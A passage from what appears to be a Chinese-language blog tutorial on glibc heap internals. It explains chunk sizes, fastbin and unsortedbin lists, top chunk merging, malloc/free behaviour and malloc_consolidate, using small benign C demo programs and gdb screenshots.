class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>0x109模0x10为9 所以pre_size不够用 需要多申请1个单元</p><p>chunk被隐式对齐位0x110</p><p>64位16字节对齐 0x110+0x10+0x1</p></blockquote><p><img src="/2020/12/15/%E5%A0%86/image-20201214191149578.png" alt="image-20201214191149578"></p><h3 id="0x09-chunk的大小"><a href="#0x09-chunk的大小" class="headerlink" title="0x09 chunk的大小"></a>0x09 chunk的大小</h3><p>其实上一节我们就演示了 但这一节还是重点讲一下</p><h4 id="1-chunk的实际大小"><a href="#1-chunk的实际大小" class="headerlink" title="1.chunk的实际大小"></a>1.chunk的实际大小</h4><ul><li>当用户通过malloc函数申请堆内存时，可以使用的内存的起始地址是从fd成员开始的，所以用户无法访问结构体的前两个成员</li><li>当用户申请size大小的堆块时，在glibc中本质上是申请了size+16大小（64位系统中）的内存，因为要加上前两个成员</li><li>例如：malloc(0x10);申请了0x10大小的堆内存，本质上在glibc中申请了0x10+0x10=0x20大小的空间</li><li><strong>chunk的实际大小=malloc的大小+chunk的前两个成员+mchunk_prev_size成员的合并操作+chunk对齐规则</strong></li></ul><p>这个上面演示过了 就不演示了</p><h4 id="2-chunk的最低大小"><a href="#2-chunk的最低大小" class="headerlink" title="2.chunk的最低大小"></a>2.chunk的最低大小</h4><ul><li>malloc的堆块大小在glibc中会加上前两个成员的大小（0x10大小），所以当你分配一个堆内存时，堆内存的最小大小一定为0x20（0x10+0x10）。（即使malloc没有指定大小，也要分配fd和bk成员，所以加起来就是malloc_chunk结构体的前4个成员的大小总和）</li><li><strong>chunk的最低大小一定为0x20大小</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//int size=0x109;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/15/%E5%A0%86/image-20201214191901328.png" alt="image-20201214191901328"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201214191928725.png" alt="image-20201214191928725"></p><h3 id="0x10-bins的单向链表、双向链表存储结构"><a href="#0x10-bins的单向链表、双向链表存储结构" class="headerlink" title="0x10 bins的单向链表、双向链表存储结构"></a>0x10 bins的单向链表、双向链表存储结构</h3><h4 id="1-fastbins的单向链表存储结构"><a href="#1-fastbins的单向链表存储结构" class="headerlink" title="1.fastbins的单向链表存储结构"></a>1.fastbins的单向链表存储结构</h4><ul><li>fastbins是单向链表存储，fastbins中的的chunk是不会合并的（glibc规定这些chunk的PREV_INUSE位永远为1）</li></ul><blockquote><p><strong>存储结构：</strong></p><ul><li><strong>fastbins的存储采用后进先出（LIFO）的原则：</strong>后free的chunk会被添加到先free的chunk的后面；同理，通过malloc取出chunk时是先去取最新放进去的</li><li>因为是单链表，fastbins中的所有chunk的bk是没有用到的</li><li>并且fastbins比较特殊，一个fastbin链第一个chunk指向于一个特殊的“0”，然后后面接的是后free的chunk……以此类推，最后一个chunk再由arena的malloc_state的fastbinsY数组所管理</li></ul><p><img src="/2020/12/15/%E5%A0%86/image-20201215160058074.png" alt="image-20201215160058074"></p></blockquote><p><strong>演示</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x10</span>;</span><br><span class="line">    <span class="keyword">int</span> size2=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(size2);</span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了程序打断点，没有其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>打到断点处 heap的信息</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215160443811.png" alt="image-20201215160443811"></p><p>释放p1 p2</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215160534048.png" alt="image-20201215160534048"></p><p>可以看到第一个被释放chunk的fd指针指向0 而第二个被释放chunk的fd指针指向第一个</p><p>看一下main_arena 可以看到是指向最后一个chunk 也就验证了上面的结论</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215160746395.png" alt="image-20201215160746395"></p><p>接下来我们释放第三个</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215161151487.png" alt="image-20201215161151487"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201215161023500.png" alt="image-20201215161023500"></p><p>由于与前两个大小不同所以我们会新开一个链表 说明main_arena的地址也不一样</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215161240081.png" alt="image-20201215161240081"></p><p>此次演示也就完成了</p><p>32位可自行演示</p></blockquote><h4 id="2-unsortedbin的双向链表存储结构"><a href="#2-unsortedbin的双向链表存储结构" class="headerlink" title="2.unsortedbin的双向链表存储结构"></a>2.unsortedbin的双向链表存储结构</h4><ul><li>free的chunk大小如果大于0x80会放到unsortedbin上</li><li>unsortedbin存储这些chunk是使用双向循环链表进行存储的（<strong>smallbins、largebins也是如此，此处只介绍unsortedbin</strong>）</li></ul><blockquote><p><strong>存储结构</strong>：</p><ul><li><strong>存储循环先入先出（FIFO）原则：</strong>上面的是先free掉的chunk，下面是后free掉的chunk；同理，通过malloc取出chunk时是先取上面的，再取下面的</li><li><strong>一个bins中只有一个freechunk时：</strong>就是下面这种表示形式。可以看到freechunk的fd和bk都指向于bins的fd，所以我们使用gdb调试时可以用命令看到，当bin链中只有一个freechunk时，其fd和bk都是相同的，都指向于bins的fd</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190729213257204.png" alt="img"></p><ul><li><strong>一个bins中有多个freechunk时：</strong>上面使我们的struct malloc_state结构体，结构体中的bins数组存储的就是这些bin链，下面就是bins数组中存储unsortedbin的位置，这个数组元素存储的其实就是一个fd和一个bk指针。下面第一个就是第一个free掉的chunk，再下面一个就是第二个free掉的chunk……以此类推</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190729212907497.png" alt="img"></p></blockquote><p><strong>演示</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">int</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">int</span> *temp=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//防止p1与p2合并</span></span><br><span class="line">    <span class="keyword">int</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);   </span><br><span class="line">    <span class="keyword">int</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);   <span class="comment">//防止p2被top chunk合并</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>打断点</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215163335296.png" alt="image-20201215163335296"></p><p>释放p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215163518823.png" alt="image-20201215163518823"></p><p>从上面我们也可以看到下一个chunk的标志p位为0了</p><p>看下main_arena</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215163755383.png" alt="image-20201215163755383"></p><p>释放p2</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215164417439.png" alt="image-20201215164417439"></p><p>可以看到main_arena是变了的</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215165029835.png" alt="image-20201215165029835"></p><p>bins头中fd-&gt;p2 bk-&gt;p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215170240262.png" alt="image-20201215170240262"> </p><p>演示完成</p></blockquote><h3 id="0x11-top-chunk的向前合并"><a href="#0x11-top-chunk的向前合并" class="headerlink" title="0x11 top chunk的向前合并"></a>0x11 top chunk的向前合并</h3><h4 id="1-top-chunk概念"><a href="#1-top-chunk概念" class="headerlink" title="1.top chunk概念"></a>1.top chunk概念</h4><ul><li>当我们分配一块堆内存时，top chunk是出于地址的最高处的，其前面就是我们所申请的chunk</li></ul><h4 id="2-top-chunk的合并操作"><a href="#2-top-chunk的合并操作" class="headerlink" title="2.top chunk的合并操作"></a>2.top chunk的合并操作</h4><ul><li>如果top chunk前面的chunk不是fast chunk并且处于空闲，那么top chunk就会合并这个chunk</li><li>如果top chunk前面的chunk是fast chunk，不论是否空闲，top chunk都不会合并这个chunk</li></ul><h4 id="3-演示-1"><a href="#3-演示-1" class="headerlink" title="3.演示"></a>3.演示</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>断点 堆信息</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215194907019.png" alt="image-20201215194907019"></p><p>释放p2 可以看到p2是fastbins 未被合并</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215194956787.png" alt="image-20201215194956787"></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>断点</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215195122071.png" alt="image-20201215195122071"></p><p>释放p2 可以看到p2被合并了</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215195147425.png" alt="image-20201215195147425"></p></blockquote><h4 id="4-如何防止top-chunk的合并"><a href="#4-如何防止top-chunk的合并" class="headerlink" title="4.如何防止top chunk的合并"></a>4.如何防止top chunk的合并</h4><ul><li>只需要在free掉的chunk后面继续申请一个chunk，这样top chunk就不会合并之前的chunk</li></ul><h3 id="0x12-chunk的malloc、free"><a href="#0x12-chunk的malloc、free" class="headerlink" title="0x12 chunk的malloc、free"></a>0x12 chunk的malloc、free</h3><h4 id="1-malloc的机制"><a href="#1-malloc的机制" class="headerlink" title="1.malloc的机制"></a>1.malloc的机制</h4><ul><li><strong>如果程序是第一次malloc：</strong>会创建一个很大的“top chunk”</li><li><strong>如果程序是第二次及之后malloc：</strong>会去先向bins链表寻找空间，如果没有再去向“top chunk”要空间；如果“top chunk”使用完了再通过glibc重新申请一块新的“top chunk”</li></ul><h4 id="2-演示"><a href="#2-演示" class="headerlink" title="2.演示"></a>2.演示</h4><p>上面我们已经演示过很多回了 第一次就不演示了 这里主要来看一下第二次的malloc</p><p>这里是拿fastbin的例子</p><h5 id="恰好分割一整块的free-chunk（fastbin）"><a href="#恰好分割一整块的free-chunk（fastbin）" class="headerlink" title="恰好分割一整块的free chunk（fastbin）"></a><strong>恰好分割一整块的free chunk（fastbin）</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>直接看free掉p1之后可以看到是进入fastbin了</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200256907.png" alt="image-20201215200256907"></p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200306820.png" alt="image-20201215200306820"></p><p>我们在来申请p2 可以看见是直接覆盖了p1</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200355918.png" alt="image-20201215200355918"></p></blockquote><h5 id="切割一块chunk（fastbin）"><a href="#切割一块chunk（fastbin）" class="headerlink" title="切割一块chunk（fastbin）"></a><strong>切割一块chunk（fastbin）</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);    sleep(<span class="number">0</span>); <span class="comment">//只为了程序打断点，无其他作用</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们直接看p2分配之后把</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215200826010.png" alt="image-20201215200826010"></p><p>这里可以看出它并未用fastbin的chunk 而是从top chunk切割了一部分</p></blockquote><h5 id="恰好分割一整块的free-chunk（unsorted-bin）"><a href="#恰好分割一整块的free-chunk（unsorted-bin）" class="headerlink" title="恰好分割一整块的free chunk（unsorted bin）"></a><strong>恰好分割一整块的free chunk（unsorted bin）</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x200</span>;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//为了达到演示效果，防止p被top chunk合并</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>看一下chunk的信息</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201134939.png" alt="image-20201215201134939"></p><p>free p1，将p1放入了unsorted bin中</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201206634.png" alt="image-20201215201206634"></p><p>分配p3 可以看到是直接覆盖p1的地方</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201235306.png" alt="image-20201215201235306"></p></blockquote><h5 id="切割一块chunk（unsorted-bin）"><a href="#切割一块chunk（unsorted-bin）" class="headerlink" title="切割一块chunk（unsorted bin）"></a><strong>切割一块chunk（unsorted bin）</strong></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">void</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//为了防止p被topchunk合并</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里我们直接看p2分配之后</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215201554898.png" alt="image-20201215201554898"></p><p>这里为什么会出现这个情况呢？</p><p>其实它是在unsorted bin中切割了一块符合自己大小的chunk 拿出来分配</p></blockquote><p><strong>分割一块较大的free chunk（unsorted bin）</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">void</span> *temp=<span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//为了防止p被topchunk合并</span></span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用</span></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">    <span class="built_in">free</span>(p2);c</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>根据上面的理论这回就应该去top chunk中切割了 事实也确实如此</p><p><img src="/2020/12/15/%E5%A0%86/image-20201215202105325.png" alt="image-20201215202105325"></p></blockquote><p>经过以上演示我们不难得出一下结论</p><ol><li>只要切割大小正好 它就会从已free的chunk中寻找</li><li>关于fastbin 和 unsorted bin中free chunk分配是不一样的</li><li>如果较大 会从top chunk中寻找</li></ol><h4 id="3-free的机制"><a href="#3-free的机制" class="headerlink" title="3.free的机制"></a>3.free的机制</h4><ul><li>①如果free的chunk的大小在0x20~0x80之间（fastbin的范围），那么该chunk直接放到fast bin上</li><li>②如果free的chunk的大小大于0x80（大于fast bin的范围），此时不会直接放到small bin或者large bin上面。而是放到unsorted bin上面</li></ul><h3 id="0x13-malloc-consolidate"><a href="#0x13-malloc-consolidate" class="headerlink" title="0x13 malloc_consolidate"></a>0x13 malloc_consolidate</h3><p><strong>这个主要是解决unsorted bin中的碎片化，整合成新的bin，也就是放入small bin或large bin中</strong></p><h4 id="1-consolidate的定义"><a href="#1-consolidate的定义" class="headerlink" title="1.consolidate的定义"></a>1.consolidate的定义</h4><ul><li>我们知道大于0x80的chunk被释放之后就放到了unsortedbin上面去，但是unsortedbin是一个未分类的bin，上面的chunk也处于未分类的状态。但是这些chunk需要在特定的条件下被整理然后放入到smallbins或者largebins中</li><li>这个整理的过程被称为unsortedbin的“consolidate”，但是“consolidate”是要在特定的条件下才会发生的，并且与malloc紧密相关</li></ul><h4 id="2-触发场景"><a href="#2-触发场景" class="headerlink" title="2.触发场景"></a>2.触发场景</h4><ul><li>当我们malloc一个chunk，这个chunk的大小大于smallbin的范围，在unsortedbin中寻找可用的freechunk使用时，会触发malloc_conlolidate</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190810155737453.png" alt="img"></p><ul><li>malloc时如果bin链中没有可以使用的freechunk，并且去切割topchunk，发现topchunk也不够用，此时回去再去调用malloc_consolidate进行一次整理</li></ul><p><img src="/2020/12/15/%E5%A0%86/20190810155901661.png" alt="img"></p><ul><li>发现unsortedbin中有大的freechunk可以切割给malloc使用时，切割unsortedbin，产生last remainder的时候会consolidate</li></ul><p><strong>着重强调，1和2都会去寻找fastbin中的free chunk</strong></p><h4 id="3-具体分析"><a href="#3-具体分析" class="headerlink" title="3.具体分析"></a>3.具体分析</h4><p><strong>当我们malloc一个大小大于smallbin的chunk时：</strong></p><ul><li><p><strong>第一步：</strong>将fastbins中的chunk都整理到unsortedbin中，整理的过程中如果有物理相邻且空闲的fastchunk就合并，如果fastchunk与topchunk相邻，那么fastchunk就与topchunk合并（这个过程发生在_int_malloc函数调用的malloc_consolidate函数中）</p></li><li><p><strong>第二步：</strong>malloc去检查unsortedbin中是否有与自己malloc大小相对应的chunk可以使用，如果有与自己malloc大小相对应的chunk可以使用就直接使用；如果没有那么就去判断unsortedbin中是否有可以用来切割的大chunk可以使用，如果可以切割，就切割大的chunk使用，然后产生last remainder（这个过程发生在_int_malloc函数的for循环中）</p></li><li><strong>第三步：</strong>如果没有可以切割的大chunk可以使用，此时就将unsortedbin上的chunk放入到对应的bins链上</li><li><strong>第四步：</strong>malloc从第一次分配的大堆块上面找空间来使用</li></ul><h4 id="4-演示一"><a href="#4-演示一" class="headerlink" title="4.演示一"></a>4.演示一</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 